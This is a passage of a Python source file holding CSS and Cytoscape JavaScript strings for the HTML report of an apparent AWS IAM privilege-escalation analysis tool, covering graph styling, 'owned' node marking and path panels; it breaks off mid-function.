.path-block{background:linear-gradient(145deg,var(--bg4),var(--bg3));border-radius:var(--radius);padding:20px;margin-top:16px;border:1px solid var(--bd);transition:all 0.2s}
.path-block:hover{border-color:var(--olive-dark)}
.path-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px}
.path-score{font-family:var(--mono);font-size:11px;color:var(--olive);background:var(--ok2);padding:4px 10px;border-radius:var(--radius-sm)}
.path-hops{display:flex;flex-direction:column;gap:6px}
.path-hop{display:flex;align-items:center;gap:14px;font-family:var(--mono);font-size:12px;padding:12px 16px;background:linear-gradient(135deg,var(--bg2),var(--bg3));border-radius:var(--radius-sm);border:1px solid var(--bd);transition:all 0.15s}
.path-hop:hover{border-color:var(--olive-dark);background:var(--bg3)}
.path-arrow{color:var(--olive);font-size:18px;font-weight:bold}

/* Tables */
.trust-table{width:100%;border-collapse:collapse;font-size:13px}
.trust-table th{text-align:left;padding:10px 14px;background:var(--bg3);font-size:10px;text-transform:uppercase;letter-spacing:0.5px;color:var(--tx2);font-family:var(--mono);font-weight:600}
.trust-table td{padding:10px 14px;border-bottom:1px solid var(--bd)}
.trust-table tr:hover td{background:var(--bg3)}

/* Escalation Table */
.escalation-table{width:100%;border-collapse:collapse;font-size:12px;margin-bottom:8px}
.escalation-table th{text-align:left;padding:8px 10px;background:var(--bg3);font-size:10px;text-transform:uppercase;letter-spacing:0.5px;color:var(--tx2);font-family:var(--mono);font-weight:600;border-bottom:2px solid var(--bd)}
.escalation-table td{padding:8px 10px;border-bottom:1px solid var(--bd);vertical-align:middle}
.escalation-table tr:hover td{background:var(--bg3)}
.escalation-table code{background:var(--bg4);padding:2px 6px;border-radius:4px;font-family:var(--mono)}

/* Remediation */
.remediation-box{background:var(--ok2);border-radius:var(--radius);padding:16px;margin-top:12px;border:1px solid var(--ok3)}
.remediation-box h5{font-size:11px;color:var(--ok);margin-bottom:8px;font-family:var(--mono);font-weight:600}
.remediation-box p{font-size:13px;color:var(--tx)}

/* Capability List */
.cap-list{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:6px}
.cap-list li{font-size:12px;color:var(--tx);padding:10px 14px;background:var(--bg3);border-radius:6px;display:flex;gap:10px;align-items:flex-start}
.cap-list li::before{content:"→";color:var(--ac);font-family:var(--mono);font-weight:600}

/* Copy Button - Dark Olive */
.copy-btn{font-family:var(--mono);font-size:10px;padding:6px 12px;background:var(--bg3);border:1px solid var(--olive-dark);color:var(--olive);border-radius:var(--radius);cursor:pointer;transition:all 0.15s;font-weight:500}
.copy-btn:hover{background:var(--olive-dark);border-color:var(--olive);color:#fff}
.copy-btn.copied{background:var(--olive);border-color:var(--olive);color:#000}

/* Footer */
.footer{text-align:center;padding:20px;font-size:11px;color:var(--tx2);border-top:1px solid var(--bd);font-family:var(--mono)}

.no-findings{text-align:center;padding:40px;color:var(--ok);font-family:var(--mono);font-size:14px;background:var(--ok2);border-radius:var(--radius)}

@media print{.copy-btn,.sidebar{display:none}.main-wrapper{margin-left:0}}

/* Graph Visualizer - Olive/Black Theme */
.graph-section{background:linear-gradient(145deg,var(--bg2),var(--bg3));border-radius:var(--radius-lg);margin:32px 0;overflow:hidden;border:1px solid var(--bd);box-shadow:var(--shadow-lg)}
.graph-header{background:linear-gradient(135deg,var(--olive-dark),#3a5a4a);padding:18px 24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:14px}
.graph-title{color:#fff;font-size:16px;font-weight:700;display:flex;align-items:center;gap:12px}
.graph-title-icon{width:32px;height:32px;background:linear-gradient(135deg,var(--olive),var(--olive-dark));border-radius:var(--radius-sm);display:flex;align-items:center;justify-content:center;box-shadow:0 0 10px rgba(132,169,140,0.3)}
.graph-controls{display:flex;gap:8px;flex-wrap:wrap}
.graph-btn{font-family:var(--mono);font-size:10px;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.2);color:#e2e8f0;border-radius:var(--radius-sm);cursor:pointer;transition:all 0.2s;font-weight:600}
.graph-btn:hover{background:rgba(132,169,140,0.3);border-color:var(--olive);color:#fff}
.graph-btn.active{background:var(--olive);border-color:var(--olive);color:#000}
.graph-btn.owned-active{background:var(--olive-bright);border-color:var(--olive-bright);color:#000}
.layout-btn.active{background:var(--olive);border-color:var(--olive);color:#000}
.graph-canvas{height:650px;background:linear-gradient(135deg,#0a0f0a 0%,#141a14 50%,#0d120d 100%);position:relative}
.graph-loading{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:var(--olive-dark);font-family:var(--mono);font-size:14px}
.graph-legend{background:var(--bg4);padding:14px 24px;display:flex;flex-wrap:wrap;gap:20px;border-top:1px solid var(--bd)}
.legend-item{display:flex;align-items:center;gap:8px;color:var(--tx);font-size:11px;font-family:var(--mono)}
.legend-dot{width:12px;height:12px;border-radius:50%;border:2px solid rgba(255,255,255,0.2)}
.legend-dot.admin{background:var(--cr);box-shadow:0 0 8px rgba(255,107,107,0.4)}
.legend-dot.shadow{background:var(--hi);box-shadow:0 0 8px rgba(251,191,36,0.4)}
.legend-dot.user{background:var(--olive);box-shadow:0 0 8px rgba(132,169,140,0.4)}
.legend-dot.role{background:var(--md);box-shadow:0 0 8px rgba(96,165,250,0.4)}
.legend-dot.group{background:var(--purple);box-shadow:0 0 8px rgba(167,139,250,0.4)}
.legend-dot.owned{background:var(--olive-bright);box-shadow:0 0 10px var(--olive-bright)}
.graph-info{position:absolute;bottom:20px;left:20px;background:rgba(10,15,10,0.95);border:1px solid var(--olive-dark);border-radius:var(--radius);padding:18px;min-width:300px;max-width:400px;display:none;color:#fff;font-size:12px;z-index:10;backdrop-filter:blur(12px)}
.graph-info.visible{display:block;animation:fade-in 0.2s ease}
.graph-info-title{font-weight:700;font-size:14px;margin-bottom:12px;color:var(--olive-bright)}
.graph-info-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(132,169,140,0.2)}
.graph-info-row:last-child{border-bottom:none}
.graph-info-key{color:var(--tx2)}
.graph-info-val{color:#fff;font-family:var(--mono)}
.graph-info-actions{margin-top:12px;padding-top:12px;border-top:1px solid var(--olive-dark);display:flex;gap:8px}
.graph-info-btn{font-family:var(--mono);font-size:10px;padding:8px 14px;background:var(--bg3);border:1px solid var(--olive-dark);color:var(--olive-light);border-radius:var(--radius-sm);cursor:pointer;transition:all 0.2s;flex:1;text-align:center;font-weight:600}
.graph-info-btn:hover{background:var(--olive-dark);color:#fff}
.graph-info-btn.owned{background:var(--olive);border-color:var(--olive);color:#000}
.graph-search{position:absolute;top:20px;left:20px;z-index:10}
.graph-search input{font-family:var(--mono);font-size:12px;padding:10px 14px;background:rgba(10,15,10,0.9);border:1px solid var(--olive-dark);color:#fff;border-radius:var(--radius-sm);width:240px;transition:all 0.2s}
.graph-search input:focus{outline:none;border-color:var(--olive);box-shadow:0 0 10px rgba(132,169,140,0.2)}
.graph-search input::placeholder{color:var(--tx2)}
.graph-toolbar{position:absolute;top:20px;right:20px;z-index:10;display:flex;flex-direction:column;gap:6px}
.graph-zoom-btn{width:36px;height:36px;background:rgba(10,15,10,0.9);border:1px solid var(--olive-dark);color:var(--olive-light);border-radius:var(--radius-sm);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:16px;transition:all 0.2s;font-weight:bold}
.graph-zoom-btn:hover{background:var(--olive-dark);color:#fff}
.graph-stats{position:absolute;top:20px;right:70px;background:rgba(10,15,10,0.9);border:1px solid var(--olive-dark);border-radius:var(--radius-sm);padding:10px 14px;color:var(--olive-light);font-size:10px;font-family:var(--mono);z-index:10}
.owned-panel{position:absolute;bottom:20px;right:20px;background:rgba(10,15,10,0.95);border:1px solid var(--olive);border-radius:var(--radius);padding:16px;min-width:200px;color:#fff;font-size:12px;z-index:10;backdrop-filter:blur(12px);display:none}
.owned-panel.visible{display:block;animation:fade-in 0.2s ease}
.owned-panel-title{font-weight:700;font-size:13px;color:var(--olive-bright);margin-bottom:10px;display:flex;align-items:center;gap:8px}
.owned-panel-list{max-height:160px;overflow-y:auto}
.owned-panel-item{padding:6px 10px;background:var(--bg3);border-radius:var(--radius-sm);margin-bottom:4px;display:flex;justify-content:space-between;align-items:center;font-family:var(--mono);font-size:10px;border:1px solid var(--bd)}
.owned-panel-clear{margin-top:10px;width:100%;padding:8px;background:var(--bg3);border:1px solid var(--cr3);color:var(--cr);border-radius:var(--radius-sm);cursor:pointer;font-family:var(--mono);font-size:10px;transition:all 0.2s;font-weight:600}
.owned-panel-clear:hover{background:var(--cr);border-color:var(--cr);color:#fff}
.faded{opacity:0.08!important}
.path-details-panel{position:absolute;top:70px;left:20px;background:rgba(10,15,10,0.98);border:1px solid var(--cr);border-radius:var(--radius);padding:20px;min-width:320px;max-width:400px;max-height:calc(100% - 110px);overflow-y:auto;color:#fff;font-size:12px;z-index:20;backdrop-filter:blur(12px);display:none}
.path-details-panel.visible{display:block;animation:fade-in 0.2s ease}
.path-details-title{font-weight:700;font-size:14px;color:var(--cr);margin-bottom:16px;display:flex;align-items:center;justify-content:space-between}
.path-details-close{cursor:pointer;font-size:18px;color:var(--tx2);transition:color 0.2s;width:24px;height:24px;display:flex;align-items:center;justify-content:center;border-radius:50%;background:var(--bg3)}
.path-details-close:hover{color:var(--cr);background:var(--cr2)}
.path-details-count{font-size:10px;color:var(--tx2);margin-bottom:12px;font-family:var(--mono)}
.path-item{background:var(--bg3);border:1px solid var(--bd);border-radius:var(--radius-sm);padding:14px;margin-bottom:10px;transition:all 0.2s}
.path-item:hover{border-color:var(--olive-dark)}
.path-item-header{display:flex;align-items:center;gap:10px;margin-bottom:10px}
.path-item-num{width:24px;height:24px;background:linear-gradient(135deg,var(--cr),#ff4757);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0}
.path-item-source{color:#fff;font-family:var(--mono);font-size:11px;font-weight:600}
.path-item-arrow{text-align:center;color:var(--olive);font-size:18px;margin:4px 0}
.path-item-target{color:var(--olive-bright);font-family:var(--mono);font-size:11px;font-weight:600;margin-bottom:8px}
.path-item-action{background:var(--bg4);border-radius:var(--radius-sm);padding:10px 12px;font-size:10px;color:var(--hi);font-family:var(--mono);line-height:1.6;border:1px solid var(--bd)}
.path-item-action strong{color:#fff}
.path-item-badge{display:inline-block;font-size:8px;padding:3px 8px;border-radius:10px;text-transform:uppercase;font-weight:700;margin-left:8px}
.path-item-badge.admin{background:linear-gradient(135deg,var(--cr),#ff4757);color:#fff}
.path-item-badge.shadow{background:linear-gradient(135deg,var(--hi),#f59e0b);color:#000}

/* MITRE & Narrative */
.mitre-tags{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px}
.mitre-tag{font-family:var(--mono);font-size:10px;padding:4px 10px;background:var(--purple2);border:1px solid var(--purple3);color:var(--purple);border-radius:4px}
.attack-narrative{background:var(--cr2);border:1px solid var(--cr3);border-radius:var(--radius);padding:14px;margin-top:12px;font-size:13px;line-height:1.7;color:var(--tx)}
.attack-narrative strong{color:var(--cr)}

/* Account Section */
.account-section{margin-bottom:16px}
.account-header{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;background:var(--bg2);border:1px solid var(--bd);border-radius:var(--radius);cursor:pointer;transition:all 0.15s}
.account-header:hover{background:var(--bg3)}
.account-header-left{display:flex;align-items:center;gap:12px}
.account-chevron{font-size:10px;color:var(--tx2);transition:transform 0.2s}
.account-chevron.open{transform:rotate(90deg)}
.account-name{font-family:var(--mono);font-size:13px;font-weight:600;color:var(--txb)}
.account-meta{font-size:11px;color:var(--tx2);font-family:var(--mono)}
.account-body{display:none;padding:14px 0}
.account-body.open{display:block}

/* Query Results - Modern Card Style with Explanations */
.query-card{background:linear-gradient(145deg,var(--bg2),var(--bg3));border:1px solid var(--bd);border-radius:var(--radius-lg);padding:24px;margin-bottom:20px;transition:all 0.25s ease;position:relative;overflow:hidden}
.query-card::before{content:'';position:absolute;top:0;left:0;width:4px;height:100%;background:linear-gradient(180deg,var(--olive),var(--olive-dark))}
.query-card:hover{box-shadow:var(--shadow-lg),var(--shadow-glow);border-color:var(--olive-dark);transform:translateY(-2px)}
.query-card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
.query-card-title{font-size:16px;font-weight:700;color:var(--olive-light)}
.query-card-count{font-family:var(--mono);font-size:28px;font-weight:800;color:var(--olive-bright);text-shadow:0 0 20px rgba(132,169,140,0.3)}
.query-card-desc{font-size:13px;color:var(--tx);margin-bottom:16px;padding:14px;background:var(--bg4);border-radius:var(--radius-sm);border-left:3px solid var(--olive-dark);line-height:1.6}
.query-card-why{font-size:12px;color:var(--tx2);margin-bottom:16px;padding:12px 16px;background:linear-gradient(90deg,var(--hi2),transparent);border-radius:var(--radius-sm);border-left:3px solid var(--hi)}
.query-card-why strong{color:var(--hi)}
.query-card-body{display:flex;flex-direction:column;gap:12px}
.query-group{display:flex;flex-wrap:wrap;gap:8px;align-items:center;padding:12px;background:var(--bg4);border-radius:var(--radius-sm)}
.query-group-label{font-family:var(--mono);font-size:9px;text-transform:uppercase;color:var(--olive);margin-right:8px;font-weight:700;letter-spacing:1.2px;min-width:60px}
.query-principal{font-family:var(--mono);font-size:10px;padding:6px 12px;background:var(--bg3);border-radius:var(--radius-sm);color:var(--tx);transition:all 0.2s ease;cursor:pointer;display:inline-flex;align-items:center;gap:5px;border:1px solid var(--bd)}
.query-principal:hover{background:var(--olive-dark);color:#fff;border-color:var(--olive);transform:translateY(-1px)}
.query-principal.user{background:linear-gradient(135deg,var(--ok2),#1a3a2a);color:var(--olive-bright);border-color:var(--olive-dark)}
.query-principal.role{background:linear-gradient(135deg,var(--md2),#1a2a4a);color:#60a5fa;border-color:#2a3a5a}
.query-principal.more{color:var(--tx2);font-style:italic;border-style:dashed;background:transparent}
.query-admin-tag{font-size:8px;padding:3px 6px;background:linear-gradient(135deg,#ff6b6b,#ff4757);color:#fff;border-radius:4px;margin-left:5px;font-weight:700;text-shadow:0 1px 2px rgba(0,0,0,0.3)}
.query-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}
.query-mini-card{background:linear-gradient(145deg,var(--bg2),var(--bg3));border:1px solid var(--bd);border-radius:var(--radius);padding:18px;transition:all 0.25s ease}
.query-mini-card:hover{box-shadow:var(--shadow);border-color:var(--olive-dark);transform:translateY(-2px)}
.query-mini-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
.query-action{font-size:9px;background:var(--bg4);color:var(--olive);padding:4px 10px;border-radius:var(--radius-sm);border:1px solid var(--olive-dark);font-weight:600}
.query-mini-title{font-size:13px;font-weight:700;color:var(--txb);margin-bottom:6px}
.query-mini-samples{font-size:10px;color:var(--tx2);font-family:var(--mono);line-height:1.5}

/* Principal Filters & Export */
.principal-controls{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:20px;align-items:center;justify-content:space-between;padding:14px 16px;background:var(--bg3);border-radius:var(--radius);border:1px solid var(--bd)}
.filter-group{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
.filter-label{font-size:10px;color:var(--tx2);text-transform:uppercase;letter-spacing:0.5px;margin-right:6px}
.filter-btn{font-family:var(--mono);font-size:10px;padding:6px 12px;background:var(--bg4);border:1px solid var(--bd);color:var(--tx2);border-radius:20px;cursor:pointer;transition:all 0.15s}
.filter-btn:hover{border-color:var(--olive);color:var(--olive)}
.filter-btn.active{background:var(--olive);border-color:var(--olive);color:#000;font-weight:600}
.filter-btn.critical{border-color:var(--cr3)}
.filter-btn.critical:hover,.filter-btn.critical.active{background:var(--cr);border-color:var(--cr);color:#fff}
.filter-btn.high{border-color:var(--hi3)}
.filter-btn.high:hover,.filter-btn.high.active{background:var(--hi);border-color:var(--hi);color:#000}
.export-group{display:flex;gap:6px}
.export-btn{font-family:var(--mono);font-size:10px;padding:6px 12px;background:transparent;border:1px solid var(--olive-dark);color:var(--olive);border-radius:var(--radius-sm);cursor:pointer;transition:all 0.15s;display:flex;align-items:center;gap:4px}
.export-btn:hover{background:var(--olive-dark);color:#fff;border-color:var(--olive)}
.export-btn svg{width:12px;height:12px}
.query-card[data-hidden="true"]{display:none}
.query-mini-card[data-hidden="true"]{display:none}

/* Syntax Highlighting - Sublime/Monokai Style */
.cli-block{position:relative;margin:16px 0;border-radius:var(--radius);overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,0.4)}
.cli-block-header{display:flex;justify-content:flex-end;align-items:center;padding:8px 16px;background:#272822;border-bottom:1px solid #3e3d32}
.cli-code{font-family:'SF Mono','Fira Code','Monaco','Consolas',var(--mono);font-size:12px;background:#272822;color:#f8f8f2;padding:16px;overflow-x:auto;white-space:pre-wrap;word-break:break-word;line-height:1.6;tab-size:4;-moz-tab-size:4;max-width:100%}
.cli-code .ln{color:#75715e;user-select:none;margin-right:16px;min-width:24px;display:inline-block;text-align:right}
.cli-code .comment{color:#75715e;font-style:italic}
.cli-code .cmd{color:#a6e22e;font-weight:600}
.cli-code .subcmd{color:#66d9ef;font-weight:500}
.cli-code .flag{color:#fd971f}
.cli-code .flagval{color:#e6db74}
.cli-code .str{color:#e6db74}
.cli-code .var{color:#ae81ff}
.cli-code .arn{color:#66d9ef;text-decoration:underline;text-decoration-style:dotted;text-underline-offset:2px}
.cli-code .pipe{color:#f92672;font-weight:bold}
.cli-code .redir{color:#f92672}
.cli-code .builtin{color:#66d9ef;font-style:italic}
.cli-code .num{color:#ae81ff}
.cli-code .path{color:#fd971f}

/* Copy ARN & Toast - Dark Olive */
.copy-arn{display:inline-flex;align-items:center;gap:3px;cursor:pointer;padding:2px 4px;border-radius:3px;transition:all 0.15s;font-size:10px}
.copy-arn:hover{background:var(--ok2);color:var(--olive)}
.copy-arn .copy-icon{opacity:0;transition:opacity 0.15s}
.copy-arn:hover .copy-icon{opacity:1}
.copied-toast{position:fixed;bottom:24px;right:24px;background:var(--olive);color:#000;padding:12px 18px;border-radius:var(--radius);font-family:var(--mono);font-size:12px;z-index:9999;animation:slide-up 0.2s ease;box-shadow:var(--shadow-lg);font-weight:500}
.arn-text{cursor:pointer;transition:all 0.15s;padding:2px 4px;border-radius:3px}
.arn-text:hover{background:var(--ok2);color:var(--olive)}

/* Export Panel - Dark Olive */
.export-panel{position:fixed;bottom:20px;left:260px;right:20px;background:var(--bg2);border:1px solid var(--olive-dark);border-radius:var(--radius);padding:14px 18px;display:none;z-index:1000;box-shadow:var(--shadow-lg)}
.export-panel.visible{display:flex;align-items:center;justify-content:space-between;animation:slide-up 0.2s ease}
.export-panel-info{color:var(--tx);font-size:12px}
.export-panel-count{color:var(--olive);font-family:var(--mono);font-weight:600;margin-left:6px}
.export-panel-actions{display:flex;gap:8px}
.export-btn{font-family:var(--mono);font-size:10px;padding:8px 14px;background:var(--bg3);border:1px solid var(--olive-dark);color:var(--olive);border-radius:var(--radius);cursor:pointer;transition:all 0.15s}
.export-btn:hover{background:var(--olive-dark);border-color:var(--olive);color:#fff}
.export-btn.primary{background:var(--olive);border-color:var(--olive);color:#000;font-weight:500}
.export-btn.primary:hover{background:var(--olive-light)}

/* Run Info Panel */
.run-info{background:linear-gradient(145deg,var(--bg2),var(--bg3));border:1px solid var(--bd);border-radius:var(--radius-lg);padding:20px 24px;margin-bottom:24px}
.run-info-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid var(--bd)}
.run-info-title{font-size:14px;font-weight:700;color:var(--txb);display:flex;align-items:center;gap:10px}
.run-info-title::before{content:"";width:4px;height:16px;background:var(--olive);border-radius:2px}
.run-info-badge{font-family:var(--mono);font-size:10px;padding:4px 10px;background:var(--olive-dark);color:var(--olive-bright);border-radius:var(--radius-sm)}
.run-info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px}
.run-info-item{display:flex;flex-direction:column;gap:4px}
.run-info-label{font-size:10px;text-transform:uppercase;letter-spacing:0.5px;color:var(--tx2);font-weight:600}
.run-info-value{font-family:var(--mono);font-size:12px;color:var(--tx);word-break:break-word}
.run-info-value.highlight{color:var(--olive-bright)}
.run-info-regions{display:flex;flex-wrap:wrap;gap:6px;margin-top:4px}
.run-info-region{font-family:var(--mono);font-size:10px;padding:3px 8px;background:var(--bg4);border:1px solid var(--bd);border-radius:4px;color:var(--tx2)}
.run-info-region.excluded{background:var(--cr2);border-color:var(--cr3);color:var(--cr)}
.run-info-toggle{font-family:var(--mono);font-size:10px;color:var(--olive);cursor:pointer;margin-left:8px}
.run-info-toggle:hover{text-decoration:underline}

/* Site Footer */
.site-footer{position:fixed;bottom:0;left:240px;right:0;background:rgba(10,10,10,0.95);backdrop-filter:blur(8px);border-top:1px solid var(--bd);padding:12px 24px;display:flex;justify-content:space-between;align-items:center;font-size:11px;z-index:100;color:var(--tx2)}
.site-footer a{color:var(--olive);text-decoration:none}
.site-footer a:hover{text-decoration:underline}

/* Policy Viewer */
.policy-viewer{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;display:none;overflow:auto;padding:40px}
.policy-viewer.visible{display:flex;justify-content:center;align-items:flex-start}
.policy-viewer-content{background:var(--bg2);border:1px solid var(--bd);border-radius:var(--radius);width:min(90%,900px);max-height:calc(100vh - 80px);overflow:hidden;display:flex;flex-direction:column}
.policy-viewer-header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;border-bottom:1px solid var(--bd);background:var(--bg3)}
.policy-viewer-title{font-weight:600;font-size:14px;color:var(--tx);display:flex;align-items:center;gap:10px}
.policy-viewer-arn{font-family:var(--mono);font-size:11px;color:var(--tx2);max-width:500px;overflow:hidden;text-overflow:ellipsis}
.policy-viewer-close{background:none;border:none;color:var(--tx2);font-size:24px;cursor:pointer;padding:4px 8px;line-height:1}
.policy-viewer-close:hover{color:var(--cr)}
.policy-viewer-body{flex:1;overflow:auto;padding:0}
.policy-code{margin:0;padding:16px;font-family:var(--mono);font-size:12px;line-height:1.6;white-space:pre-wrap;word-break:break-word;background:var(--bg)}
.policy-code .key{color:var(--olive)}
.policy-code .string{color:#7dd3fc}
.policy-code .boolean{color:#f472b6}
.policy-code .null{color:var(--tx2)}
.policy-code .number{color:#a78bfa}
.policy-code .issue{background:rgba(239,68,68,0.2);display:inline;padding:2px 0;border-radius:2px}
.policy-code .issue-line{background:rgba(239,68,68,0.15);display:block;margin:0 -16px;padding:0 16px;border-left:3px solid var(--cr)}
.policy-viewer-footer{padding:12px 20px;border-top:1px solid var(--bd);display:flex;justify-content:space-between;align-items:center;background:var(--bg3)}
.policy-viewer-legend{display:flex;gap:16px;font-size:11px;color:var(--tx2)}
.policy-viewer-legend span{display:flex;align-items:center;gap:4px}
.policy-viewer-legend .issue-dot{width:10px;height:10px;background:rgba(239,68,68,0.4);border:1px solid var(--cr);border-radius:2px}
.view-policy-btn{background:var(--bg3);border:1px solid var(--bd);color:var(--tx);font-size:10px;padding:4px 10px;border-radius:4px;cursor:pointer;display:inline-flex;align-items:center;gap:4px;font-family:var(--mono)}
.view-policy-btn:hover{background:var(--bg4);border-color:var(--olive)}
.aws-policy-badge{background:var(--md2);border:1px solid #60a5fa33;color:#60a5fa;font-size:9px;padding:3px 8px;border-radius:4px;display:inline-flex;align-items:center;gap:3px;font-family:var(--mono);cursor:default}

/* Pagination */
.pagination{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:16px;padding:12px;background:var(--bg3);border-radius:var(--radius);border:1px solid var(--bd)}
.pagination-btn{font-family:var(--mono);font-size:11px;padding:6px 12px;background:var(--bg4);border:1px solid var(--bd);color:var(--tx);border-radius:4px;cursor:pointer;transition:all 0.15s}
.pagination-btn:hover:not(:disabled){background:var(--olive-dark);border-color:var(--olive);color:var(--olive-bright)}
.pagination-btn:disabled{opacity:0.4;cursor:not-allowed}
.pagination-btn.active{background:var(--olive);border-color:var(--olive);color:#000;font-weight:600}
.pagination-info{font-size:11px;color:var(--tx2);font-family:var(--mono);padding:0 12px}
.pagination-jump{display:flex;align-items:center;gap:6px;margin-left:12px}
.pagination-jump input{width:50px;padding:4px 8px;font-size:11px;font-family:var(--mono);background:var(--bg);border:1px solid var(--bd);border-radius:4px;color:var(--tx);text-align:center}
.pagination-jump input:focus{outline:none;border-color:var(--olive)}
"""


GRAPH_JS = """
// ═══════════════════ Graph Visualizer with Owned Nodes ═══════════════════
let cy = null;
let graphData = null;
let ownedNodes = new Set();
let selectedNodeId = null;

function initGraph(data) {
    graphData = data;
    if (!data.nodes || data.nodes.length === 0) {
        document.querySelector('.graph-loading').textContent = 'No privilege escalation paths found';
        return;
    }

    cy = cytoscape({
        container: document.getElementById('cy'),
        elements: data,
        style: [
            {
                selector: 'node',
                style: {
                    'label': 'data(label)',
                    'text-valign': 'bottom',
                    'text-halign': 'center',
                    'font-size': '11px',
                    'color': '#94a3b8',
                    'text-margin-y': 8,
                    'text-wrap': 'ellipsis',
                    'text-max-width': '100px',
                    'width': 44,
                    'height': 44,
                    'background-color': 'data(color)',
                    'border-width': 3,
                    'border-color': '#334155'
                }
            },
            {
                selector: 'node[type="admin"]',
                style: {
                    'background-color': '#ef4444',
                    'border-color': '#fca5a5',
                    'shape': 'star',
                    'width': 56,
                    'height': 56
                }
            },
            {
                selector: 'node[type="shadow"]',
                style: {
                    'background-color': '#f59e0b',
                    'border-color': '#fcd34d'
                }
            },
            {
                selector: 'node[type="user"]',
                style: {
                    'background-color': '#84a98c',
                    'border-color': '#a4c3ac',
                    'shape': 'ellipse'
                }
            },
            {
                selector: 'node[type="role"]',
                style: {
                    'background-color': '#52796f',
                    'border-color': '#84a98c',
                    'shape': 'round-rectangle'
                }
            },
            {
                selector: 'node[type="group"]',
                style: {
                    'background-color': '#8b5cf6',
                    'border-color': '#c4b5fd',
                    'shape': 'diamond'
                }
            },
            {
                selector: 'node.owned',
                style: {
                    'background-color': '#a4c3ac',
                    'border-color': '#cad2c5',
                    'border-width': 4,
                    'overlay-color': '#84a98c',
                    'overlay-opacity': 0.25,
                    'overlay-padding': 10
                }
            },
            {
                selector: 'node:selected',
                style: {
                    'border-width': 4,
                    'border-color': '#cad2c5',
                    'overlay-opacity': 0.3,
                    'overlay-color': '#84a98c'
                }
            },
            {
                selector: 'edge',
                style: {
                    'width': 2,
                    'line-color': '#3a4a3a',
                    'target-arrow-color': '#3a4a3a',
                    'target-arrow-shape': 'triangle',
                    'curve-style': 'bezier',
                    'arrow-scale': 1.3
                }
            },
            {
                selector: 'edge[severity="critical"]',
                style: {
                    'line-color': '#ef4444',
                    'target-arrow-color': '#ef4444',
                    'width': 3
                }
            },
            {
                selector: 'edge[severity="high"]',
                style: {
                    'line-color': '#f59e0b',
                    'target-arrow-color': '#f59e0b'
                }
            },
            {
                selector: 'edge.attack-path',
                style: {
                    'line-color': '#84a98c',
                    'target-arrow-color': '#84a98c',
                    'width': 4,
                    'line-style': 'solid'
                }
            },
            {
                selector: 'node.attack-path',
                style: {
                    'border-color': '#a4c3ac',
                    'border-width': 5
                }
            },
            {
                selector: 'edge:selected',
                style: {
                    'line-color': '#cad2c5',
                    'target-arrow-color': '#cad2c5',
                    'width': 4
                }
            }
        ],
        layout: {
            name: 'cose',
            animate: true,
            animationDuration: 500,
            nodeRepulsion: function(node){ return 10000; },
            idealEdgeLength: function(edge){ return 120; },
            nodeOverlap: 30,
            padding: 60
        },
        minZoom: 0.2,
        maxZoom: 3,
        wheelSensitivity: 0.3
    });

    // Node click handler
    cy.on('tap', 'node', function(evt) {
        const node = evt.target;
        selectedNodeId = node.id();
        showNodeInfo(node.data(), node.id());
    });

    // Edge click handler
    cy.on('tap', 'edge', function(evt) {
        const edge = evt.target;
        showEdgeInfo(edge.data());
    });

    // Background click
    cy.on('tap', function(evt) {
        if (evt.target === cy) {
            document.querySelector('.graph-info').classList.remove('visible');
            selectedNodeId = null;
        }
    });

    // Update stats
    document.querySelector('.graph-stats').textContent =
        data.nodes.length + ' nodes | ' + data.edges.length + ' edges';
    document.querySelector('.graph-loading').style.display = 'none';
}

function showNodeInfo(data, nodeId) {
    const info = document.querySelector('.graph-info');
    const isOwned = ownedNodes.has(nodeId);
    const isAdmin = data.type === 'admin' || data.is_admin;

    info.innerHTML = `
        <div class="graph-info-title">${escapeHtml(data.label)}</div>
        <div class="graph-info-row"><span class="graph-info-key">Type:</span><span class="graph-info-val">${data.type}</span></div>
        <div class="graph-info-row"><span class="graph-info-key">ARN:</span><span class="graph-info-val" style="font-size:10px">${escapeHtml(data.arn || 'N/A')}</span></div>
        ${isAdmin ? '<div class="graph-info-row"><span class="graph-info-key">Admin:</span><span class="graph-info-val" style="color:#ef4444">Yes</span></div>' : ''}
        ${isOwned ? '<div class="graph-info-row"><span class="graph-info-key">Status:</span><span class="graph-info-val" style="color:#22c55e">OWNED</span></div>' : ''}
        ${data.paths_to_admin ? '<div class="graph-info-row"><span class="graph-info-key">Paths to Admin:</span><span class="graph-info-val">' + data.paths_to_admin + '</span></div>' : ''}
        <div class="graph-info-actions">
            <button class="graph-info-btn ${isOwned ? 'owned' : ''}" onclick="toggleOwned('${escapeJsString(nodeId)}')">${isOwned ? '✓ Owned' : 'Mark Owned'}</button>
            ${!isAdmin ? '<button class="graph-info-btn" onclick="showPathsToAdmin(\\''+escapeJsString(nodeId)+'\\')">Paths to Admin</button>' : ''}
        </div>
    `;
    info.classList.add('visible');
}

function showEdgeInfo(data) {
    const info = document.querySelector('.graph-info');
    info.innerHTML = `
        <div class="graph-info-title">Escalation Path</div>
        <div class="graph-info-row"><span class="graph-info-key">From:</span><span class="graph-info-val">${escapeHtml(data.source_name || data.source)}</span></div>
        <div class="graph-info-row"><span class="graph-info-key">To:</span><span class="graph-info-val">${escapeHtml(data.target_name || data.target)}</span></div>
